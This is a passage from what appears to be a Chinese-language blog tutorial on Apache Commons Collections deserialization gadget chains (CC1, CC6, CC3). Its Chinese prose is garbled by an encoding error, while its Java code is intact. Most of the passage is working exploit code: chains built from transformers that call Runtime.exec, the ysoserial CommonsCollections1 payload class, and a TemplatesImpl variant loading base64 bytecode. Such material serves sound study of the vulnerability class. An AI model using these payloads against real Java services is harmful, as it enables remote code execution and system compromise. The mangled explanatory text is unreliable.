innerMap.put(\u0026#34;value\u0026#34;, \u0026#34;xxx\u0026#34;); Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); Class cls = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor construct = cls.getDeclaredConstructor(Class.class, Map.class); construct.setAccessible(true); InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class, outerMap); ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(handler); oos.close(); System.out.println(barr); ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); Object o = (Object) ois.readObject(); } } ä»…æœ‰demoçš„ä»£ç ä¸è¶³ä»¥æ„é€ å®Œå…¨å¯ç”¨çš„pocï¼Œå®é™…çš„ååºåˆ—åŒ–ä¸­ï¼Œä¸åŒäºæ‰‹å·¥æ‰§è¡ŒouterMap.put()ï¼Œæˆ‘ä»¬ç¦»ä¸å¼€ä¸€ä¸ªåˆé€‚çš„readObjectè§¦å‘outerMap.put-\u0026gt;transform\nè¿™é‡Œç”¨åˆ°çš„æ˜¯sun.reflect.annotation.AnnotationInvocationHandlerï¼Œçœ‹ä¸€ä¸‹å®ƒçš„readObject\nprivate void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException { var1.defaultReadObject(); AnnotationType var2 = null; try { var2 = AnnotationType.getInstance(this.type); } catch (IllegalArgumentException var9) { throw new InvalidObjectException(\u0026#34;Non-annotation type in annotation serial stream\u0026#34;); } Map var3 = var2.memberTypes(); Iterator var4 = this.memberValues.entrySet().iterator(); while(var4.hasNext()) { Entry var5 = (Entry)var4.next(); String var6 = (String)var5.getKey(); Class var7 = (Class)var3.get(var6); if (var7 != null) { Object var8 = var5.getValue(); if (!var7.isInstance(var8) \u0026amp;\u0026amp; !(var8 instanceof ExceptionProxy)) { var5.setValue((new AnnotationTypeMismatchExceptionProxy(var8.getClass() + \u0026#34;[\u0026#34; + var8 + \u0026#34;]\u0026#34;)).setMember((Method)var2.members().get(var6))); } } } } ä»£ç æ¯”è¾ƒå¥½çœ‹æ‡‚ï¼Œå…ˆæ˜¯å¾—åˆ°å‰é¢ä¼ å…¥çš„Mapï¼ˆæˆ‘ä»¬ä¼ å…¥ç»è¿‡TransformedMapä¿®é¥°çš„å¯¹è±¡ï¼‰ï¼Œä¹‹åä¾æ¬¡éå†ï¼Œåˆ°äº†setValueæ—¶ä¼šè§¦å‘transformçš„å›è°ƒ\næ‰€ä»¥æˆ‘ä»¬æ„é€ POCæ—¶éœ€è¦åˆ›å»ºAnnotationInvocationHandlerå¯¹è±¡ï¼Œå¹¶æŠŠå‰é¢çš„HashMapä¼ è¿›æ¥ä½œä¸ºMapå‚æ•°\nClass cls = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor construct = cls.getDeclaredConstructor(Class.class, Map.class); construct.setAccessible(true); InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class, outerMap); åŒæ—¶å› ä¸ºAnnotationInvocationHandleræ˜¯å†…éƒ¨ç±»ä¸èƒ½ç›´æ¥newï¼Œæˆ‘ä»¬ç”¨åå°„+setAccessible(true)çš„æ–¹å¼å®ä¾‹åŒ–ï¼›å¹¶ä¸”ç”±äºRuntime.getRuntimeæ²¡æœ‰å®ç°åºåˆ—åŒ–çš„æ¥å£ï¼Œæ‰€ä»¥æˆ‘ä»¬ç”¨åå°„è·å–å½“å‰ä¸Šä¸‹æ–‡çš„Runtimeå¯¹è±¡\nå¦å¤–ï¼Œä¸ºäº†æ»¡è¶³readObjectä¸­çš„var7!=nullçš„åˆ¤æ–­ï¼Œè¦æ»¡è¶³\nsun.reflect.annotation.AnnotationInvocationHandleræ„é€ å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºAnnotationçš„å­ç±»ï¼Œä¸”å¿…é¡»è‡³å°‘å«æœ‰ä¸€ä¸ªæ–¹æ³•ï¼Œå‡è®¾æ–¹æ³•åä¸ºX è¢«TransformedMap.decorateä¿®é¥°çš„Mapä¸­å¿…æœ‰ä¸€ä¸ªé”®åä¸ºXçš„å…ƒç´  8u71ä¹‹åçš„ç‰ˆæœ¬ä¿®æ”¹äº†AnnotationInvocationHandlerçš„readObjectå‡½æ•°ï¼Œä¸å†ä½¿ç”¨ååºåˆ—åŒ–å¾—åˆ°çš„Mapå¯¹è±¡ï¼Œè€Œæ˜¯æ–°å»ºäº†LinkedHashMapå¯¹è±¡ï¼ŒæŠŠåŸæ¥çš„key-valueæ·»åŠ è¿›å»ï¼Œæ‰€ä»¥åç»­å¯¹Mapçš„æ“ä½œéƒ½æ˜¯åŸºäºè¿™ä¸ªLinkedHashMapå¯¹è±¡ï¼Œä¸ä¼šå†è§¦å‘setæˆ–putäº†\næœ€åæŠŠå¯¹è±¡ç”Ÿæˆåºåˆ—åŒ–æµ\nByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(obj); oos.close; LazyMap package ysoserial.payloads; import java.lang.reflect.InvocationHandler; import java.util.HashMap; import java.util.Map; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.LazyMap; import ysoserial.payloads.annotation.Authors; import ysoserial.payloads.annotation.Dependencies; import ysoserial.payloads.annotation.PayloadTest; import ysoserial.payloads.util.Gadgets; import ysoserial.payloads.util.JavaVersion; import ysoserial.payloads.util.PayloadRunner; import ysoserial.payloads.util.Reflections; /* Gadget chain: ObjectInputStream.readObject() AnnotationInvocationHandler.readObject() Map(Proxy).entrySet() AnnotationInvocationHandler.invoke() LazyMap.get() ChainedTransformer.transform() ConstantTransformer.transform() InvokerTransformer.transform() Method.invoke() Class.getMethod() InvokerTransformer.transform() Method.invoke() Runtime.getRuntime() InvokerTransformer.transform() Method.invoke() Runtime.exec() Requires: commons-collections */ @SuppressWarnings({\u0026#34;rawtypes\u0026#34;, \u0026#34;unchecked\u0026#34;}) @PayloadTest ( precondition = \u0026#34;isApplicableJavaVersion\u0026#34;) @Dependencies({\u0026#34;commons-collections:commons-collections:3.1\u0026#34;}) @Authors({ Authors.FROHOFF }) public class CommonsCollections1 extends PayloadRunner implements ObjectPayload\u0026lt;InvocationHandler\u0026gt; { public InvocationHandler getObject(final String command) throws Exception { final String[] execArgs = new String[] { command }; // inert chain for setup final Transformer transformerChain = new ChainedTransformer( new Transformer[]{ new ConstantTransformer(1) }); // real chain for after setup final Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[] { String.class, Class[].class }, new Object[] { \u0026#34;getRuntime\u0026#34;, new Class[0] }), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[] { String.class }, execArgs), new ConstantTransformer(1) }; final Map innerMap = new HashMap(); final Map lazyMap = LazyMap.decorate(innerMap, transformerChain); final Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class); final InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy); Reflections.setFieldValue(transformerChain, \u0026#34;iTransformers\u0026#34;, transformers); // arm with actual transformer chain return handler; } public static void main(final String[] args) throws Exception { PayloadRunner.run(CommonsCollections1.class, args); } public static boolean isApplicableJavaVersion() { return JavaVersion.isAnnInvHUniversalMethodImpl(); } } ysoserialç”¨çš„æ˜¯ä¸TransformedMapç±»ä¼¼çš„LazyMapï¼Œä¸¤è€…çš„åŒºåˆ«åœ¨äºTransformedMapæ˜¯åœ¨æ‰§è¡Œputæ“ä½œæ—¶å›è°ƒtransformï¼Œè€ŒLazyMapæ˜¯åœ¨getæ–¹æ³•ä¸­æ‰§è¡Œçš„factory.transformï¼Œåœ¨getæ‰¾ä¸åˆ°å€¼æ‰ä¼šè°ƒç”¨factory.transformå»è·å–ä¸€ä¸ªå€¼ï¼ˆæ‰€è°“Lazy\npublic Object get(Object key){ if(map.containsKey(key) == false){ Object value = factory.transform(key); map.put(key, value); return value; } return map.get(key); } LazyMapçš„åˆ©ç”¨æ¯”TransformedMapå¤æ‚ï¼Œå› ä¸ºAnnotationInvocationHandlerè¦†å†™çš„readObjectä¸­å¹¶æ²¡æœ‰ç›´æ¥ä½¿ç”¨Mapçš„getï¼Œæ‰€ä»¥è¿™é‡Œé€‰æ‹©é€šè¿‡javaå¯¹è±¡ä»£ç†çš„æŠ€æœ¯æ¥è§¦å‘å®ƒçš„invoke è¿›è€Œåˆ°get\næˆ‘ä»¬çŸ¥é“å¯¹è±¡ä»£ç†å¯ä»¥åœ¨è¿è¡ŒæœŸåŠ¨æ€åˆ›å»ºæŸä¸ªinterfaceçš„å®ä¾‹ï¼Œå¯ä»¥ç¼–å†™InvocationHandleræ¥å®ç°æ¥å£çš„æ–¹æ³•è°ƒç”¨ï¼Œå¯ä»¥åšåˆ°åŠ å·¥å’Œè¦†å†™ï¼ˆä¹Ÿæ­£æ˜¯å«åšProxyçš„åŸå›  å¯¹æ¥å£è¿›è¡ŒProxy çœå»ä¸­é—´ç±»ï¼‰ï¼Œç±»ä¼¼PHPé­”æœ¯æ–¹æ³•ä¸­çš„__call å¯ä»¥åŠ«æŒå¯¹è±¡å†…éƒ¨çš„æ–¹æ³•è°ƒç”¨ï¼Œç”¨åˆ°java.reflect.Proxy\nMap proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[]{Map.class}, handler); ç¬¬ä¸€ä¸ªå‚æ•°ClassLoaderæˆ‘ä»¬ä½¿ç”¨é»˜è®¤çš„å³å¯ï¼Œç¬¬äºŒä¸ªæ˜¯æˆ‘ä»¬éœ€è¦ä»£ç†çš„å¯¹è±¡é›†åˆï¼Œç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯ä¸€ä¸ªå®ç°äº†InvocationHandleræ¥å£çš„å¯¹è±¡ï¼Œé‡Œé¢åŒ…å«äº†å…·ä½“çš„ä»£ç†é€»è¾‘\næ¯”å¦‚ä¸€ä¸ªè¦†å†™äº†invokeæ–¹æ³•çš„ExampleInvocationHandlerç±»\nimport java.lang.reflect.InvocationHandler; import java.lang.reflect.Method; import java.util.Map; public class ExampleInvocationHandler implements InvocationHandler { protected Map map; public ExampleInvocationHandler(Map map){ this.map = map; } @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable{ if(method.getName().compareTo(\u0026#34;get\u0026#34;) == 0){ System.out.println(\u0026#34;Hookmethod: \u0026#34; + method.getName()); return \u0026#34;Hacked Object\u0026#34;; } return method.invoke(this.map, args); } } ä½œç”¨æ˜¯ç›‘æ§åˆ°è°ƒç”¨çš„æ–¹æ³•åæ˜¯getæ—¶è¿”å›Hacked Objectå­—ç¬¦ä¸²ï¼Œæˆ‘ä»¬å°è¯•å¤–éƒ¨è°ƒç”¨å®ƒ\nimport java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import java.util.HashMap; import java.util.Map; public class App { public static void main(String[] args) throws Exception{ InvocationHandler handler = new ExampleInvocationHandler(new HashMap()); Map proxyMap = (Map)Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[]{Map.class}, handler); proxyMap.put(\u0026#34;hello\u0026#34;, \u0026#34;world\u0026#34;); String result = (String) proxyMap.get(\u0026#34;hello\u0026#34;); System.out.println(result); } } å›æ˜¾Hook methd: get Hacked Object\nå›çœ‹sun.reflect.annotation.AnnotationInvocationHandlerï¼Œå¦‚æœæˆ‘ä»¬æŠŠè¿™ä¸ªå¯¹è±¡ç”¨Proxyè¿›è¡Œä»£ç†ï¼Œé‚£ä¹ˆreadObjectæ—¶åªè¦è°ƒç”¨ä»»æ„æ–¹æ³• å°±ä¼šè¿›å…¥AnnotationInvocationHandler#invokeè§¦å‘get\næ„é€  å…ˆæ˜¯ç”¨LazyMapæ›¿æ¢TransformedMap\nMap outerMap = LazyMap.decorate(innerMap, transformerChain); ç„¶åå¯¹sun.reflect.annotation.AnnotationInvocationHandlerè¿›è¡ŒProxy\nClass cls = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor construct = cls.getDeclaredConstructor(Class.class, Map.class); construct.setAccessible(true); InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class, outerMap); Map proxyMap = (Map)Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[]{Map.class}, handler); ä»£ç†åçš„å¯¹è±¡æ˜¯proxyMapï¼Œä½†æ˜¯ä¸èƒ½ç›´æ¥å¯¹å…¶åºåˆ—åŒ– æˆ‘ä»¬çš„å…¥å£ç‚¹æ˜¯sun.reflect.annotation.AnnotationInvocationHandler#readObjectï¼Œè¿˜è¦å†ç”¨AnnotationInvocationHandlerå¯¹è¿™ä¸ªproxyMapåŒ…è£¹\nhandler = (InvocationHandler)construct.newInstance(Retention.class, proxyMap); æ³¨æ„åˆ°ysoserialçš„æœ«å°¾æœ‰new ConstantTransformer(1)ï¼Œå¯ä»¥éšè—å¯åŠ¨è¿›ç¨‹çš„æ—¥å¿—ç‰¹å¾\nâ€”â€”â€”â€”æ³¨æ„ï¼šLazyMapçš„CC1åŒæ ·æ— æ³•è§£å†³8u71åçš„ä½¿ç”¨é—®é¢˜ï¼Œå°½ç®¡å®ƒçš„æ¼æ´è§¦å‘åœ¨getå’Œinvokeï¼Œå’ŒsetValueæ— å…³\nCC6 ä¸Šé¢æåˆ°CC1ç”±äºsun.reflect.annotation.AnnotationInvocationHandler#readObjectåœ¨8u71åçš„é€»è¾‘å˜åŒ–å¯¼è‡´å¤±æ•ˆï¼Œè¿™é‡Œæ¥çœ‹ä¸€æ¡è§£å†³é«˜ç‰ˆæœ¬Javaåˆ©ç”¨çš„CC6ï¼ˆä»£ç éƒ¨åˆ†æ¥è‡ªpç‰›\n/* -\u0026gt; Gadget chain: java.io.ObjectInputStream.readObject() java.util.HashMap.readObject() java.util.HashMap.hash() org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode() org.apache.commons.collections.keyvalue.TiedMapEntry.getValue() org.apache.commons.collections.map.LazyMap.get() org.apache.commons.collections.functors.ChainedTransformer.transform() org.apache.commons.collections.functors.InvokerTransformer.transform() java.lang.reflect.Method.invoke() java.lang.Runtime.exec() */ CC6è§£å†³CC1çš„æ–¹æ¡ˆæ˜¯åœ¨ä¸Šä¸‹æ–‡ä¸­å¯»æ‰¾å…¶å®ƒå¯ä»¥è°ƒç”¨LazyMap.getçš„åœ°æ–¹ï¼Œç”¨åˆ°çš„æ˜¯org.apache.commons.collections.keyvalue.TiedMapEntry\npackage org.apache.commons.collections.keyvalue; import java.io.Serializable; import java.util.Map; import java.util.Map.Entry; import org.apache.commons.collections.KeyValue; public class TiedMapEntry implements Entry, KeyValue, Serializable { private static final long serialVersionUID = -8453869361373831205L; private final Map map; private final Object key; public TiedMapEntry(Map map, Object key) { this.map = map; this.key = key; } public Object getKey() { return this.key; } public Object getValue() { return this.map.get(this.key); } // ... public int hashCode() { Object value = this.getValue(); return (this.getKey() == null ? 0 : this.getKey().hashCode()) ^ (value == null ? 0 : value.hashCode()); } // .. } åœ¨å®ƒçš„getValueä¸­è°ƒç”¨äº†this.map.getï¼Œè€ŒhashCodeæ–¹æ³•è°ƒç”¨äº†getValueï¼ˆHashMapçš„å®ç°åŸç†ï¼‰ï¼Œåœ¨ysoserialä¸­æ˜¯åˆ©ç”¨java.util.HashSet#readObjectåˆ°HashMap#put()åˆ°HashMap#hash(key)æœ€ååˆ°TiedMapEntry#hashCode()\nåœ¨pç‰›çš„ç®€åŒ–pocä¸­çœç•¥äº†å‰ä¸¤æ­¥ï¼Œé€šè¿‡HashMap#readObjectç›´æ¥åˆ°HashMap#hash(key)ï¼Œhashä¸­è°ƒç”¨äº†key.hashCodeï¼ˆçº¯HashMapçš„å®ç°åŸç†\næ„é€ pocï¼Œæˆ‘ä»¬åªéœ€è¦è®©è¿™ä¸ªkeyç­‰äºTiedMapEntryå¯¹è±¡ï¼Œå†æ”¹åŠ¨äº¿ç‚¹ç‚¹\né¦–å…ˆæ˜¯æ¶æ„LazyMap\nimport org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.HashMap; import java.util.Map; public class testCC6 { public static void main(String[] args) throws Exception{ Transformer[] fakeTransformers = new Transformer[]{new ConstantTransformer(1)}; // é¿å…ç”Ÿæˆpayloadæ—¶è§¦å‘RCE Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[]{String.class, Class[].class}, new Object[]{\u0026#34;getRuntime\u0026#34;, new Class[0]} ), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[]{Object.class, Object.class}, new Object[]{null, new Object[0]} ), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new String[]{\u0026#34;calc.exe\u0026#34;} ), new ConstantTransformer(1), }; Transformer transformerChain = new ChainedTransformer(fakeTransformers); Map innerMap = new HashMap(); Map outerMap = LazyMap.decorate(innerMap, transformerChain);\t// å¾—åˆ°è¢«è£…é¥°åçš„æ¶æ„LazyMapå¯¹è±¡ TiedMapEntry tme = new TiedMapEntry(outerMap, \u0026#34;keykey\u0026#34;); Map expMap = new HashMap();\t// ä¸ºäº†è°ƒç”¨TiedMapEntry#hashCode æ–°å»ºHashMap å¹¶æŠŠtmeä½œä¸ºkey expMap.put(tme, \u0026#34;valuevalue\u0026#34;); outerMap.remove(\u0026#34;keykey\u0026#34;); // putä¹Ÿä¼šè°ƒç”¨hash(key) é¿å…å¯¹åé¢getçš„å½±å“ Field f = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;);\t// æ›¿æ¢çœŸæ­£çš„transformers f.setAccessible(true); f.set(transformerChain, transformers); ByteArrayOutputStream barr = new ByteArrayOutputStream();\t// åºåˆ—åŒ–éƒ¨åˆ† ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(expMap); oos.close(); System.out.println(barr);\t// è§¦å‘ ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); Object o = (Object) ois.readObject(); } } é€»è¾‘æ˜¯æ¯”è¾ƒæ¸…æ™°çš„ï¼Œæ¯ä¸€éƒ¨åˆ†ä¹Ÿéƒ½æ¯”è¾ƒå¥½æ‡‚\nCC3(\u0026lt;8u71 ç”±äºTemplatesImplå¯ä»¥ç›´æ¥æ§åˆ¶å­—èŠ‚ç ï¼ˆå³javaä»£ç ï¼‰ï¼Œæ‰€ä»¥å°è¯•ç»“åˆCC1 demoå’Œæ‰§è¡Œå­—èŠ‚ç çš„éƒ¨åˆ†å°±å¯ä»¥æ„é€ å‡ºCC3ï¼ˆçš„ä¸€éƒ¨åˆ†ï¼‰äº†ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯è¦å°†InvokerTransformeræ‰§è¡Œçš„æ–¹æ³•ä»æ˜¾å¼çš„rceï¼ˆgetRuntime.execï¼‰å˜ä¸ºè°ƒç”¨TemplatesImpl::newTransformer\nimport org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.util.Base64; import java.util.HashMap; import java.util.Map; public class testCC3mini { public static void main(String[] args) throws Exception{ byte[] code = Base64.getDecoder().decode(\u0026#34;yv66vgAAADQAIQoABgASCQATABQIABUKABYAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwADgAPBwAbDAAcAB0BABNIZWxsbyBUZW1wbGF0ZXNJbXBsBwAeDAAfACABABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAAIAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAACgALAAAABAABAAwAAQAOAA8AAQAJAAAALQACAAEAAAANKrcAAbIAAhIDtgAEsQAAAAEACgAAAA4AAwAAAA0ABAAOAAwADwABABAAAAACABE=\u0026#34;); TemplatesImpl obj = new TemplatesImpl(); setFieldValue(obj, \u0026#34;_bytecodes\u0026#34;, new byte[][]{code}); setFieldValue(obj, \u0026#34;_name\u0026#34;, \u0026#34;HelloTemplatesImpl\u0026#34;); setFieldValue(obj, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); Transformer[] transformers = new Transformer[]{ new ConstantTransformer(obj), new InvokerTransformer(\u0026#34;newTransformer\u0026#34;, null, null ) }; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); outerMap.put(\u0026#34;test\u0026#34;, \u0026#34;amiz\u0026#34;); } public static void setFieldValue(Object obj, String fieldName, Object value)throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } } ä½†æ˜¯å¹¶ä¸æ˜¯æ ‡å‡†çš„payloadï¼Œysoserialä¸­å¹¶æ²¡æœ‰ç”¨åˆ°InvokerTransformerï¼ŒåŸå› æ˜¯SerialKillerçš„å­˜åœ¨é™åˆ¶äº†å®ƒï¼Œæˆ‘ä»¬æ¢ä¸ºcom.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter\nè¿™ä¸ªç±»çš„æ„é€ æ–¹æ³•ä¸­è°ƒç”¨äº†äº†(TransformerImpl) templates.newTransformer()ï¼Œå…å»äº†æˆ‘ä»¬çš„æ‰‹å·¥è°ƒç”¨\nç¼ºå°‘InvokerTransformeræ— æ³•è°ƒç”¨TraAXFilterçš„æ„é€ æ–¹æ³•ï¼Œè¿™é‡Œç”¨org.apache.commons.collections.functors.InstantiateTransformerè¿™ä¸ªTransformer\næ‰€ä»¥æˆ‘ä»¬åˆ©ç”¨InstantiateTransformerè°ƒç”¨åˆ°TrAXFilterçš„æ„é€ æ–¹æ³•ï¼Œå†åˆ©ç”¨å®ƒæ„é€ æ–¹æ³•ä¸­çš„templates.newTransformerè°ƒç”¨åˆ°TemplatesImplé‡Œçš„å­—èŠ‚ç \nTransformer[] transformers = new Transformer[]{ new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer( new Class[]{Templates.class}, new Object[]{obj}) }; å®Œæ•´CC3\npackage ysoserial.payloads; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import javassist.ClassPool; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InstantiateTransformer; import org.apache.commons.collections.map.TransformedMap; import javax.xml.transform.Templates; import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.annotation.Retention; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.lang.reflect.InvocationHandler; import java.util.Base64; import java.util.HashMap; import java.util.Map; public class testCC3 { public static void main(String[] args) throws Exception { TemplatesImpl obj = new TemplatesImpl(); // setFieldValue(obj, \u0026#34;_bytecodes\u0026#34;, new byte[][]{Base64.getDecoder().decode(\u0026#34;yv66vgAAADQAIQoABgASCQATABQIABUKABYAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwADgAPBwAbDAAcAB0BABNIZWxsbyBUZW1wbGF0ZXNJbXBsBwAeDAAfACABABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAAIAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAACgALAAAABAABAAwAAQAOAA8AAQAJAAAALQACAAEAAAANKrcAAbIAAhIDtgAEsQAAAAEACgAAAA4AAwAAAA0ABAAOAAwADwABABAAAAACABE=\u0026#34;)}); setFieldValue(obj, \u0026#34;_bytecodes\u0026#34;, new byte[][]{ ClassPool.getDefault().get(evil.EvilTemplatesImpl.class.getName()).toBytecode() }); setFieldValue(obj, \u0026#34;_name\u0026#34;, \u0026#34;HelloTemplatesImpl\u0026#34;); setFieldValue(obj, \u0026#34;_name\u0026#34;, \u0026#34;HelloTemplatesImpl\u0026#34;); setFieldValue(obj, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); Transformer[] fakeTransformers = new Transformer[] { new ConstantTransformer(1) }; Transformer[] transformers = new Transformer[]{ new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer( new Class[] { Templates.class }, new Object[] { obj } ) }; Transformer transformerChain = new ChainedTransformer(fakeTransformers); Map innerMap = new HashMap(); innerMap.put(\u0026#34;value\u0026#34;, \u0026#34;xxxx\u0026#34;); Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); Class cls = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor construct = cls.getDeclaredConstructor(Class.class, Map.class); construct.setAccessible(true); InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class, outerMap); setFieldValue(transformerChain, \u0026#34;iTransformers\u0026#34;, transformers); ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(handler); oos.close(); System.out.println(barr); ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); Object o = (Object) ois.readObject(); } public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception { Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } } CCK1(Shiro-550) 